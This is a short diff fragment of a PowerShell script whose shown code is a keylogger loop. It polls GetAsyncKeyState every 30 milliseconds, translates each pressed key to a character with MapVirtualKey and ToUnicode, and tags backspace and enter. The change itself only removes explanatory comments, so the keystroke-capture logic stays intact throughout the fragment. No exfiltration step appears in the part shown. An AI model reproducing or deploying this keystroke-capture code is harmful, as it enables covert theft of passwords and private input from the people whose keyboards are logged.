@@ -98,7 +98,6 @@ While ($true){
       # Start the loop with 30 ms delay between keystate check
       Start-Sleep -Milliseconds 30
         for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (is any key currently pressed)
         $keyst = $defs::GetAsyncKeyState($asc)
           # If a key is pressed
           if ($keyst -eq -32767) {
@@ -108,13 +107,11 @@ While ($true){
           $null = [console]::CapsLock
           # Translate the keycode to a letter
           $vtkey = $defs::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create stringbuilder
           $kbst = New-Object Byte[] 256
           $checkkbst = $defs::GetKeyboardState($kbst)
           $logchar = New-Object -TypeName System.Text.StringBuilder
             # Define the key that was pressed          
             if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              # Check for non-character keys
               $LString = $logchar.ToString()
                 if ($asc -eq 8) {$LString = "[BACK]"}
                 if ($asc -eq 13) {$LString = "[ENT]"}
